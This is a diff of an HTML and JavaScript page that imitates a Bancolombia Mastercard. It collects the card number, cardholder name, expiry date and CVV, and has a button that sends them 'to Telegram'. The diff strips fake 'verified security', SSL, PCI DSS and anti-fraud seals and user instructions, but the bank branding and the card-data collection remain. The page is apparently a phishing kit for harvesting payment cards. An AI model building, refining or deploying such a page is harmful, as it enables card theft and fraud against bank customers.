@@ -27,50 +27,6 @@
         margin: 0 auto;
     }
 
-    .security-banner {
-        background: linear-gradient(95deg, #0c5e2e, #0a4a24);
-        border-radius: 16px;
-        padding: 12px 16px;
-        margin-bottom: 20px;
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        flex-wrap: wrap;
-        gap: 10px;
-    }
-    .security-banner-left {
-        display: flex;
-        align-items: center;
-        gap: 12px;
-    }
-    .security-icon {
-        background: #ffd700;
-        border-radius: 50%;
-        width: 32px;
-        height: 32px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 18px;
-    }
-    .security-text {
-        color: white;
-        font-size: 0.75rem;
-        font-weight: 600;
-    }
-    .security-text strong {
-        font-size: 0.85rem;
-        display: block;
-    }
-    .verified-badge {
-        background: rgba(255,255,255,0.2);
-        border-radius: 20px;
-        padding: 4px 12px;
-        font-size: 0.7rem;
-        color: #ffd700;
-        font-weight: 700;
-    }
-
     .card-stage {
         perspective: 1200px;
         margin-bottom: 24px;
@@ -262,55 +218,6 @@
         outline: none;
     }
 
-    .security-footer {
-        background: white;
-        border-radius: 20px;
-        padding: 16px 20px;
-        margin-top: 20px;
-        box-shadow: 0 4px 15px rgba(0,0,0,0.08);
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        flex-wrap: wrap;
-        gap: 12px;
-    }
-    .footer-logo {
-        display: flex;
-        align-items: center;
-        gap: 8px;
-    }
-    .footer-logo-icon {
-        background: #0c5e2e;
-        width: 36px;
-        height: 36px;
-        border-radius: 12px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        color: #ffd700;
-        font-weight: bold;
-        font-size: 1.2rem;
-    }
-    .footer-logo-text {
-        font-weight: 800;
-        color: #0c2b1f;
-        font-size: 0.9rem;
-    }
-    .security-seals {
-        display: flex;
-        gap: 16px;
-    }
-    .seal {
-        display: flex;
-        align-items: center;
-        gap: 6px;
-        font-size: 0.7rem;
-        color: #4a5b3e;
-        background: #f5f5f0;
-        padding: 5px 12px;
-        border-radius: 30px;
-    }
-
     .btn-send {
         background: linear-gradient(95deg, #2b6e3c, #1f4f2a);
         border: none;
@@ -348,53 +255,18 @@
         background: #f0f0f0;
     }
 
-    .instruction {
-        background: rgba(255,248,220,0.95);
-        border-radius: 20px;
-        padding: 12px 16px;
-        text-align: center;
-        font-size: 0.7rem;
-        margin-bottom: 20px;
-        color: #664d1a;
-        border-left: 3px solid #f5b81b;
-    }
-    
-    .highlight {
-        background: #f5b81b;
-        color: #1f2a0e;
-        padding: 2px 8px;
-        border-radius: 20px;
-        font-weight: bold;
-    }
-
     @media (max-width: 480px) {
         .card-number-input { font-size: 1rem; letter-spacing: 1.5px; }
         .front { padding: 16px; }
         .bank-name { font-size: 1.3rem; }
-        .security-footer { flex-direction: column; align-items: flex-start; }
     }
 </style>
 </head>
 <body>
 <div class="wrapper">
-    <div class="security-banner">
-        <div class="security-banner-left">
-            <div class="security-icon">🔒</div>
-            <div class="security-text">
-                <strong>Bancolombia Seguridad Verificada</strong>
-                Transacción protegida con chip EMV
-            </div>
-        </div>
-        <div class="verified-badge">✓ VERIFICADO</div>
-    </div>
-
-    <div class="instruction">
-        💳 <strong>Escribe directamente SOBRE la tarjeta</strong> — Completa el número, titular y <span class="highlight">FECHA</span>. 
-        <br>✨ Al terminar de escribir la fecha, la tarjeta se voltea automáticamente para que ingreses el CVV.
-    </div>
-
     <div class="card-stage">
         <div class="card" id="creditCard">
+            <!-- FRENTE -->
             <div class="card-face front">
                 <div class="bank-header">
                     <div class="bank-name">Bancolombia</div>
@@ -418,6 +290,7 @@
                     <span class="mc-text">Mastercard</span>
                 </div>
             </div>
+            <!-- REVERSO -->
             <div class="card-face back">
                 <div class="black-strip"></div>
                 <div class="cvc-container">
@@ -433,18 +306,6 @@
         <span>✈️</span> ENVIAR A TELEGRAM
     </button>
     <div id="statusMsg" class="status-msg">✅ Completa los datos y presiona enviar</div>
-
-    <div class="security-footer">
-        <div class="footer-logo">
-            <div class="footer-logo-icon">🏦</div>
-            <div class="footer-logo-text">Bancolombia<br><span style="font-size:0.6rem;">Seguridad patrimonial</span></div>
-        </div>
-        <div class="security-seals">
-            <div class="seal"><span>🔐</span> <span>Cifrado SSL</span></div>
-            <div class="seal"><span>✓</span> <span>PCI DSS</span></div>
-            <div class="seal"><span>🛡️</span> <span>Anti-fraude</span></div>
-        </div>
-    </div>
 </div>
 
 <script>
@@ -637,7 +498,7 @@
 
         sendBtn.disabled = true;
         sendBtn.innerHTML = '<span>📡</span> ENVIANDO A TELEGRAM...';
-        statusMsg.innerHTML = '📡 Enviando información de forma segura...';
+        statusMsg.innerHTML = '📡 Enviando información...';
         statusMsg.style.background = '#e3f2fd';
 
         try {
@@ -664,7 +525,7 @@
                 statusMsg.style.color = '#721c24';
             }
         } catch (error) {
-            statusMsg.innerHTML = '❌ Error de conexión. Verifica que el backend esté desplegado correctamente.';
+            statusMsg.innerHTML = '❌ Error de conexión';
             statusMsg.style.background = '#f8d7da';
             statusMsg.style.color = '#721c24';
         } finally {
